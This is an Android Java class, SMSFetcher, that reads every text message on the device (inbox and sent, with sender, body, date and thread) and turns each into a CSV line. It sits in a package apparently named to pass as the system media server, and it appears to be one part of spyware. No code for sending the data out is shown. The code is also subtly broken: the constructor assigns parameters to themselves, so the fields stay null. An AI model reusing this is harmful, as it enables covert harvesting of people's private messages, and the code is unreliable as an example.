package com.android.mediaserver.fetchers.provider;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import java.util.ArrayList;
import java.util.List;

public class SMSFetcher {
  public static final Uri SMS_CONTENT_URI = Uri.parse("content://sms");
  public static final Uri SMS_INBOX_CONTENT_URI = Uri.withAppendedPath(SMS_CONTENT_URI, "inbox");
  public static final Uri SMS_SENT_CONTENT_URI = Uri.withAppendedPath(SMS_CONTENT_URI, "sent");
  private Context mContext;

  public SMSFetcher(Context context) {
    mContext = context;
  }

  public List<String> fetch() {
    return getAsCSVString();
  }

  public SMSMassageEntry fetchLast() {
    Cursor cursor =
        mContext.getContentResolver().query(SMS_CONTENT_URI, null, null, null, "date DESC");
    if (cursor.moveToFirst()) {
      return getEntryFromCursor(cursor);
    }
    return null;
  }

  private List<SMSMassageEntry> getSMS() {
    List<SMSMassageEntry> sms = new ArrayList();
    Cursor cursor =
        mContext.getContentResolver().query(SMS_CONTENT_URI, null, null, null, null);
    while (cursor.moveToNext()) {
      sms.add(getEntryFromCursor(cursor));
    }
    cursor.close();
    return sms;
  }

  private List<String> getAsCSVString(List<SMSMassageEntry> allSms) {
    List<String> retLines = new ArrayList();
    String retCSVString = "";
    for (SMSMassageEntry sm : allSms) {
      retLines.add(sm.toCSVString());
    }
    return retLines;
  }

  private List<String> getAsCSVString() {
    return getAsCSVString(getSMS());
  }

  private SMSMassageEntry getEntryFromCursor(Cursor cursor) {
    return new SMSMassageEntry(cursor.getString(cursor.getColumnIndex("address")),
        cursor.getString(cursor.getColumnIndexOrThrow("body")),
        cursor.getString(cursor.getColumnIndexOrThrow("date")),
        cursor.getString(cursor.getColumnIndexOrThrow("type")),
        cursor.getString(cursor.getColumnIndexOrThrow("thread_id")),
        cursor.getString(cursor.getColumnIndexOrThrow("_id")));
  }

  public class SMSMassageEntry {
    public String address;
    public String body;
    public String date;
    public String id;
    public String thread_id;
    public String type;

    public SMSMassageEntry(String address, String body, String date, String type, String thread_id,
        String id) {
      address = address;
      body = body;
      date = date;
      type = type;
      thread_id = thread_id;
      id = id;
    }

    public String toCSVString() {
      return address
          + ",\""
          + body.replace("\n", ".").replace(",", "¶")
          + "\","
          + date
          + ","
          + type
          + ","
          + thread_id
          + ","
          + id;
    }
  }
}
